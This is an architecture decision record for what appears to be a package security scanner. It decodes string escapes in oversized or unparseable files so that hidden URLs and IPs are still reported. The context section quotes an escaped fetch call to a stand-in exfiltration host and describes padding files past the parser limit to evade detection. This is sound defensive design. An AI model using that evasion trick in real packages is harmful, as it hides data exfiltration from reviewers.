# ADR-036: Find escaped endpoints in files the parser does not read

- **Status:** Proposed
- **Date:** 2026-10-22
- **Plan reference:** PLAN §4.4 (new external domain in literals), PLAN §3 (bounded input)

## Context

ADR-026 reads the cooked value of escaped strings, but `cookedStrings` exists
only when `parseState` is `parsed` (`src/core/signal-extractor.ts:136`). A file
over the 2 MB parser limit, a parse timeout or a syntax error is marked
`unparseable` without parsing (`src/core/npm/javascript-capability-extractor.ts:189`).
The byte scan then sees the raw text, so `fetch("\x20https://exfil.example.test/x")`
has no word boundary before the scheme and `"93.184.216\x2e34"` has a backslash
where the address needs a dot. Padding a file past 2 MB therefore hides both.
When the old version is already over the limit, the diff has no endpoint
finding at all.

## Decision

For every file whose `parseState` is not `parsed`, after the byte scan, decode
a copy of the text and scan that copy with the same URL and IP rows.

1. **Decoding replaces the value the runtime would hold.** It handles `\xHH`,
   `\uHHHH`, `\u{H...}` with a code point at most 0x10FFFF, the single-character
   escapes (`\b`, `\f`, `\n`, `\r`, `\t`, `\v`, `\0`, `\\`, `\'`, `\"`, `\/`
   and an escaped non-escape character), legacy octal escapes, and a backslash
   before a line terminator, which is removed. A malformed `\x` or `\u` escape
   stays as written, so it cannot invent characters.
2. **A parallel offset map ties each decoded character to its source offset.**
   Evidence uses the source line and snippet, so a match behind an escape points
   at the escape's line, not at the shorter decoded copy.
3. **Decoded observations join the byte scan.** They carry confidence
   `byte-scan-candidate` and context `unknown`, as a byte scan does. The
   existing merge by endpoint keeps one observation per host and one evidence
   item per source line.
4. **Nothing replaces or drops a byte-scan observation.**
5. **Work stays linear and bounded.** The decoder is one pass over the source.
   Its two buffers have one entry per source character, and the decoded text is
   never longer than the source. `observeSignalSource` skips the work when the
   file holds no backslash.
6. **Parsed files are not decoded.** They already carry cooked values.

## Alternatives rejected

- **Parse the file anyway.** That removes the 2 MB limit and the timeout that
  exist to bound the run (PLAN §3).
- **Search for string literals with a regex, then decode only those.** A regex
  cannot tell a string from a comment or a regex literal, and a broken file may
  have no well-formed string. The whole-file copy is simpler and already
  bounded by the file size.
- **Report every `unparseable` file at CRITICAL without decoding.** That
  reports the padding, not the host, and makes every oversized benign package
  fail the gate. ADR-016 already handles unanalyzable packages.

## Consequences

- An escaped URL or IP in a file the parser rejects now adds the same endpoint
  observation the byte scan would. The `unparseable-escape` reconstruction
  reports a HIGH new external domain and fails the default gate.
- Escapes in comments, regex literals and identifiers are decoded too, because
  an unparseable file has no comment or string ranges. A decoded match is still
  only `byte-scan-candidate`, so a false positive cannot claim literal
  confidence.
- Decoding runs for `unsupported` and `unreadable` files as well as
  `unparseable` ones, because none of them has cooked values. An unreadable read
  produces empty bytes, so it adds no work.
- Revisit this ADR if endpoint evidence from unparseable files becomes a
  measured source of false positives, or if the parser starts returning string
  ranges for rejected files.

## How to revert

Delete the decoded scan in `observeSignalSource` and the decoder helpers next to
it. The `unparseable-escape` reconstruction then fails, which shows the evasion
is open again.
